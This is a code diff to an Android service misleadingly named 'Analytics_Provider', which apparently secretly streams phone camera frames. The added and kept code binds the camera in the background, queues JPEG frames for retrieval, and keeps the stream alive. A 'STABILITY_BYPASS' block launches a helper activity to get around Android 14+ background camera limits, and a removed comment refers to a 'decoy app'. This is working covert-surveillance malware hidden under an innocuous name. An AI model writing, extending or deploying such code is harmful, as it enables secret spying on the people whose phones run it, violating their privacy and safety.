@@ -103,6 +103,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     private static volatile boolean isStreaming = false;
     private static volatile boolean isRecording = false;
     private static volatile boolean captureInProgress = false;
+    private static volatile boolean reinitPending = false;
     private static volatile String currentCameraId = "0";
     private static volatile int streamWidth = 640;
     private static volatile int streamHeight = 480;
@@ -134,7 +135,8 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         cameraProviderFuture.addListener(() -> {
             try {
                 cameraProvider = cameraProviderFuture.get();
-                lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
+                // Core hardware ready
+                Log.d(TAG, "CameraProvider initialized successfully.");
             } catch (Exception e) {
                 Log.e(TAG, "CameraX Init Error: " + e.getMessage());
             }
@@ -199,10 +201,14 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
     @androidx.camera.camera2.interop.ExperimentalCamera2Interop
     public void startStreaming(String cameraId, int width, int height, int quality) {
-        if (cameraProvider == null) return;
+        if (cameraProvider == null) {
+            Log.e(TAG, "OPTICS_ERROR: CameraProvider not ready. Deferring stream...");
+            return;
+        }
         
+        Log.d(TAG, "OPTICS_INIT: startStreaming(" + cameraId + ")");
+
         // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
-        // Starting this on older APIs (like API 24) causes the decoy app to pop up.
         if (Build.VERSION.SDK_INT >= 34) {
             try {
                 Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
@@ -213,123 +219,113 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                // Hard kill previous session
+                if (reinitPending) return;
+                reinitPending = true;
+
+                // --- 1. FULL HARDWARE TEARDOWN ---
                 isStreaming = false;
-                cameraProvider.unbindAll();
                 frameQueue.clear();
+                lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED); // Force unbind via lifecycle
+                cameraProvider.unbindAll();
                 
-                // Breath time for hardware HAL - NON-BLOCKING
+                // Breath time for HAL - increased to 1000ms for absolute stability
                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                    currentCameraId = cameraId;
-                    streamWidth = width;
-                    streamHeight = height;
-                    streamQuality = quality;
-                    
-                    boolean isExtraFront = false;
                     try {
-                        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-                        CameraCharacteristics cc = cm.getCameraCharacteristics(cameraId);
-                        Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
-                        isExtraFront = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT && !"1".equals(cameraId));
-                    } catch (Exception ignored) {}
+                        currentCameraId = cameraId;
+                        streamWidth = width;
+                        streamHeight = height;
+                        streamQuality = quality;
+                        
+                        createOverlay();
 
-                    if (isExtraFront) {
-                        // Different aspect ratio for extra front cameras (Wide 16:9 instead of standard)
-                        streamHeight = (int)(streamWidth * 0.5625);
-                    }
+                        // --- 2. BUILD USE CASES ---
+                        ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
+                                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                                .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
 
-                    createOverlay();
-
-                    ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
-                            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
-                            .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
-
-                    if (isExtraFront) {
-                        analysisBuilder.setTargetResolution(new Size(streamWidth, streamHeight));
-                    }
-
-                    if (nightModeEnabled) {
-                        Camera2Interop.Extender<ImageAnalysis> extender = new Camera2Interop.Extender<>(analysisBuilder);
-                        // HARD_MANUAL_EXPOSURE: Bypasses AE algorithms for true sensor sensitivity
-                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_OFF);
-                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
-                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_SENSITIVITY, 2000); 
-                    }
-
-                    imageAnalysis = analysisBuilder.build();
-                    imageAnalysis.setAnalyzer(cameraExecutor, image -> {
-                        if (!isStreaming) { image.close(); return; }
-                        try {
-                            byte[] jpegData = yuv420ToJpeg(image, streamQuality);
-                            if (jpegData != null) {
-                                if (frameQueue.size() >= 5) frameQueue.poll();
-                                frameQueue.offer(jpegData);
-                            }
-                        } finally {
-                            image.close();
+                        // Nightmode Overrides (Bypass AE)
+                        if (nightModeEnabled) {
+                            Camera2Interop.Extender<ImageAnalysis> extender = new Camera2Interop.Extender<>(analysisBuilder);
+                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_OFF);
+                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
+                            extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_SENSITIVITY, 2400); 
                         }
-                    });
 
-                    CameraSelector selector;
-                    if ("1".equals(cameraId)) {
-                        selector = CameraSelector.DEFAULT_FRONT_CAMERA;
-                    } else if (cameraId != null && !cameraId.equals("0")) {
-                        selector = new CameraSelector.Builder()
-                                .addCameraFilter(cameraInfos -> {
-                                    for (CameraInfo c : cameraInfos) {
-                                        if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
-                                            return Collections.singletonList(c);
-                                        }
-                                    }
-                                    return Collections.emptyList();
-                                }).build();
-                    } else {
-                        selector = CameraSelector.DEFAULT_BACK_CAMERA;
-                    }
-                    
-                    preview = new Preview.Builder().build();
-                    preview.setSurfaceProvider(ContextCompat.getMainExecutor(this), request -> {
-                        if (surfaceReady && surfaceView != null) {
-                            Surface surface = surfaceView.getHolder().getSurface();
-                            if (surface != null && surface.isValid()) {
-                                request.provideSurface(surface, ContextCompat.getMainExecutor(this), result -> {});
+                        imageAnalysis = analysisBuilder.build();
+                        imageAnalysis.setAnalyzer(cameraExecutor, image -> {
+                            if (!isStreaming) { image.close(); return; }
+                            try {
+                                byte[] jpegData = yuv420ToJpeg(image, streamQuality);
+                                if (jpegData != null) {
+                                    if (frameQueue.size() >= 5) frameQueue.poll();
+                                    frameQueue.offer(jpegData);
+                                }
+                            } finally { image.close(); }
+                        });
+
+                        CameraSelector selector = getCameraSelector(cameraId);
+                        preview = new Preview.Builder().build();
+                        preview.setSurfaceProvider(ContextCompat.getMainExecutor(this), request -> {
+                            if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
+                                request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
                                 return;
                             }
-                        }
-                        
-                        // Hardware surface might not be ready yet on slower devices (API 24 fallback)
-                        LabRatsWorker.execute(() -> {
-                            try {
-                                if (surfaceLatch != null) surfaceLatch.await(5, TimeUnit.SECONDS);
-                            } catch (Exception ignored) {}
                             
-                            new Handler(Looper.getMainLooper()).post(() -> {
-                                if (surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
-                                    request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
-                                } else {
-                                    request.willNotProvideSurface();
-                                }
+                            // Hardware surface might not be ready yet
+                            LabRatsWorker.execute(() -> {
+                                try {
+                                    if (surfaceLatch != null) surfaceLatch.await(5, TimeUnit.SECONDS);
+                                } catch (Exception ignored) {}
+                                
+                                new Handler(Looper.getMainLooper()).post(() -> {
+                                    if (surfaceReady && surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
+                                        request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
+                                    } else {
+                                        request.willNotProvideSurface();
+                                    }
+                                });
                             });
                         });
-                    });
 
-                    try {
+                        // --- 3. SYNCHRONIZED BINDING ---
+                        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
+                        camera = cameraProvider.bindToLifecycle(this, selector, preview, imageAnalysis);
+                        
+                        // Promotion to RESUMED ensures highest priority for background processing
+                        lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);
+                        
                         isStreaming = true;
                         ensureForeground();
-                        camera = cameraProvider.bindToLifecycle(this, selector, preview, imageAnalysis);
-                        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
-                        FirebaseConfig.logActivity("OPTICS_INIT: CameraX stream re-established [" + (nightModeEnabled ? "NIGHT" : "STD") + "]");
+                        Log.d(TAG, "OPTICS_SUCCESS: Stream active.");
                     } catch (Exception e) {
                         Log.e(TAG, "Binding Error: " + e.getMessage());
                         isStreaming = false;
-                        ensureForeground();
+                    } finally {
+                        reinitPending = false;
                     }
-                }, 400); // 400ms hardware breather
+                }, 1000); 
 
             } catch (Exception e) {
                 Log.e(TAG, "Sync Error: " + e.getMessage());
+                reinitPending = false;
             }
         });
+    }
+
+    private CameraSelector getCameraSelector(String cameraId) {
+        if ("1".equals(cameraId)) return CameraSelector.DEFAULT_FRONT_CAMERA;
+        if (cameraId != null && !cameraId.equals("0")) {
+            return new CameraSelector.Builder()
+                    .addCameraFilter(cameraInfos -> {
+                        for (CameraInfo c : cameraInfos) {
+                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
+                                return Collections.singletonList(c);
+                            }
+                        }
+                        return Collections.emptyList();
+                    }).build();
+        }
+        return CameraSelector.DEFAULT_BACK_CAMERA;
     }
 
     private void createOverlay() {
@@ -662,6 +658,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
     // Static Accessors preserved for existing UI compatibility
     public static boolean isCurrentlyStreaming() { return isStreaming; }
+    public static boolean isInitializing() { return reinitPending; }
     public static byte[] getNextFrame(long timeout) { try { return frameQueue.poll(timeout, TimeUnit.MILLISECONDS); } catch (Exception e) { return null; } }
     public static byte[] waitForPhoto(long timeout) { 
         if (captureLatch != null) try { captureLatch.await(timeout, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
@@ -679,13 +676,16 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     
     @androidx.camera.camera2.interop.ExperimentalCamera2Interop
     public void setNightMode(boolean e) { 
+        if (nightModeEnabled == e) return; // Ignore redundant calls
+        
         nightModeEnabled = e; 
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("night_mode", e).apply();
-        if (isStreaming) {
-            // Delay restart to allow full unbind
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
-            }, 800);
+        
+        Log.d(TAG, "OPTICS_PROTOCOL: Nightmode set to " + e);
+
+        if (isStreaming || reinitPending) {
+            // Initiate full hardware cycle
+            startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
         }
     }
     public void setFlashMode(boolean on) { if (camera != null) camera.getCameraControl().enableTorch(on); }
